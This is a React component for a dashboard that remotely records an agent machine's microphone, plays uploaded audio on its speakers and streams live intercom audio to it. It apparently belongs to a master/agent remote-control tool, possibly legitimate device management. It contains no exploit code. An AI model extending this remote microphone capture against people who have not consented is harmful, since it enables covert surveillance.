import { useEffect, useRef, useState } from 'react'
import { dashboardSocket } from '../utils/socket'

export default function AudioPanel({ agentId, agentName }: { agentId: string; agentName: string }) {
  const [rate, setRate] = useState<number>(44100)
  const [ch, setCh] = useState<number>(1)
  const [recording, setRecording] = useState(false)
  const [talking, setTalking] = useState(false)
  const [muted, setMuted] = useState(false)
  const [uploading, setUploading] = useState(false)
  const uploadRef = useRef<HTMLInputElement | null>(null)

  // Live talk resources
  const mediaStreamRef = useRef<MediaStream | null>(null)
  const audioCtxRef = useRef<AudioContext | null>(null)
  const procRef = useRef<ScriptProcessorNode | null>(null)

  const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
  const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''

  // --- Agent mic record toggle ---
  const toggleRecord = async () => {
    if (!recording) {
      dashboardSocket.audioStart(agentId, { sample_rate: rate, channels: ch })
      setRecording(true)
    } else {
      dashboardSocket.audioStop(agentId)
      setRecording(false)
      // Give backend time to persist and expose in history, then auto-download
      setTimeout(() => autoDownloadLatestAudio(), 1200)
    }
  }

  const autoDownloadLatestAudio = async () => {
    try {
      const url = new URL(`${apiBase}/admin/history`)
      url.searchParams.set('kind', 'audio')
      url.searchParams.set('agent_id', agentId)
      url.searchParams.set('limit', '1')
      const r = await fetch(url.toString(), { headers: { Authorization: `Bearer ${token}` } })
      const j = await r.json()
      const it = Array.isArray(j?.items) && j.items.length ? j.items[0] : null
      if (it && it.storage_url) {
        const a = document.createElement('a')
        a.href = `${apiBase}${it.storage_url}`
        a.download = `audio-${(agentName||agentId).replace(/[^\w\-\. ]+/g, '_')}-${Date.now()}.wav`
        document.body.appendChild(a); a.click(); a.remove()
      }
    } catch {}
  }

  // --- Upload & play on agent speakers ---
  const onUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    setUploading(true)
    try {
      const fd = new FormData()
      fd.append('file', file)
      const res = await fetch(`${apiBase}/agent/${agentId}/upload`, { method: 'POST', body: fd, headers: { Authorization: `Bearer ${token}` } })
      const j = await res.json()
      const saved: string | undefined = j?.saved
      if (saved) {
        dashboardSocket.audioPlayPath(agentId, saved)
      } else {
        alert('Upload failed')
      }
    } catch {
      // no-op
    }
    setUploading(false)
    if (uploadRef.current) uploadRef.current.value = ''
  }

  // --- Intercom (live talk) ---
  const startTalk = async () => {
    if (talking) return
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
      mediaStreamRef.current = stream
      const ctx = new (window.AudioContext || (window as any).webkitAudioContext)({})
      audioCtxRef.current = ctx
      const src = ctx.createMediaStreamSource(stream)
      const proc = ctx.createScriptProcessor(2048, ch, ch)
      procRef.current = proc
      const actualRate = ctx.sampleRate || rate
      dashboardSocket.intercomStart(agentId, { sample_rate: Math.floor(actualRate), channels: ch })
      proc.onaudioprocess = (ev) => {
        if (muted) return
        const input = ev.inputBuffer
        const frames = input.length
        const nch = Math.min(ch, input.numberOfChannels)
        const interleaved = new Int16Array(frames * nch)
        // Interleave channels
        for (let i = 0; i < frames; i++) {
          for (let c = 0; c < nch; c++) {
            let s = input.getChannelData(c)[i]
            if (s > 1) s = 1
            else if (s < -1) s = -1
            const val = s < 0 ? s * 0x8000 : s * 0x7FFF
            interleaved[i * nch + c] = val
          }
        }
        const b = interleaved.buffer
        const b64 = arrayBufferToBase64(b)
        dashboardSocket.intercomSendChunk(agentId, { pcm_b64: b64 })
      }
      src.connect(proc)
      proc.connect(ctx.destination)
      setTalking(true)
    } catch (e) {
      console.warn('Failed to start live talk', e)
      setTalking(false)
    }
  }

  const stopTalk = () => {
    try { dashboardSocket.intercomStop(agentId) } catch {}
    setTalking(false)
    setMuted(false)
    try { if (procRef.current) procRef.current.disconnect() } catch {}
    try { if (audioCtxRef.current) audioCtxRef.current.close() } catch {}
    try { mediaStreamRef.current?.getTracks().forEach(t => t.stop()) } catch {}
    mediaStreamRef.current = null
    audioCtxRef.current = null
    procRef.current = null
  }

  const toggleTalk = () => { talking ? stopTalk() : startTalk() }

  const toggleMute = (m: boolean) => {
    setMuted(m)
    try { dashboardSocket.intercomMute(agentId, m) } catch {}
  }

  return (
    <div className="card" style={{ marginTop: 10 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
        <h3 style={{ color: '#9efc9e', margin: 0 }}>Audio Control</h3>
        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
          <select className="input" value={rate} onChange={(e)=>setRate(parseInt(e.target.value)||44100)} title="Sample rate">
            {[8000,16000,22050,44100,48000].map((r)=>(<option key={r} value={r}>{r} Hz</option>))}
          </select>
          <select className="input" value={ch} onChange={(e)=>setCh(parseInt(e.target.value)||1)} title="Channels">
            <option value={1}>Mono</option>
            <option value={2}>Stereo</option>
          </select>
          <button className="btn" onClick={toggleRecord}>{recording ? 'Stop Recording' : 'Record Agent'}</button>
          <button className={`btn ${talking ? 'secondary' : ''}`} onClick={toggleTalk}>{talking ? 'Stop Live Talk' : 'Start Live Talk'}</button>
          <label style={{ display: 'inline-flex', alignItems: 'center', gap: 6, color: '#ddd' }}>
            <input type="checkbox" checked={muted} onChange={(e)=>toggleMute(e.target.checked)} disabled={!talking} /> Mute mic
          </label>
          <button className="btn secondary" onClick={() => uploadRef.current?.click()} disabled={uploading}>{uploading ? 'Uploading...' : 'Play File on Agent'}</button>
          <input ref={uploadRef} type="file" accept="audio/*,.wav" style={{ display: 'none' }} onChange={onUpload} />
        </div>
      </div>
      <div style={{ color: '#777', fontSize: 12 }}>
        Tip: Upload WAV for best compatibility. Live talk streams raw PCM; quality depends on device and network.
      </div>
    </div>
  )
}

function arrayBufferToBase64(buf: ArrayBuffer): string {
  let binary = ''
  const bytes = new Uint8Array(buf)
  const len = bytes.byteLength
  for (let i = 0; i < len; i++) binary += String.fromCharCode(bytes[i])
  return btoa(binary)
}
